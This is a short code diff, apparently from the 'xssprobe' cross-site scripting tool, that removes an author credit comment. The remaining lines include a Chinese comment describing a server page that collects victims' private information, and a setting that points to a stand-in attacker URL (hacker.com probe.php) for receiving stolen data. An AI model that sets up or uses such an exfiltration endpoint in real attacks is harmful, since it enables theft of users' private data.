@@ -1,7 +1,4 @@
-﻿/*
-xssprobe
-by evilcos@gmail.com | @xeyeteam
-*/
+﻿
 
 // 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
 http_server = "http://www.hacker.com/xssprobe/probe.php?c=";
